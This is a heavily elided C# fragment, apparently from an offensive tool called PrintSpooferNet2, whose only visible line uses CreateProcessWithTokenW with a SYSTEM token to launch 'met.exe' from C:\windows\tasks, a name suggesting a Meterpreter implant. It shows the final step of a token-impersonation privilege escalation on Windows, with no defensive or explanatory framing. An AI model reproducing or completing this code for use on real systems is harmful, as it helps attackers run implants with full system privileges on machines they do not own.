...
namespace PrintSpooferNet2
{
    internal class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            res = CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\windows\\tasks\\met.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);
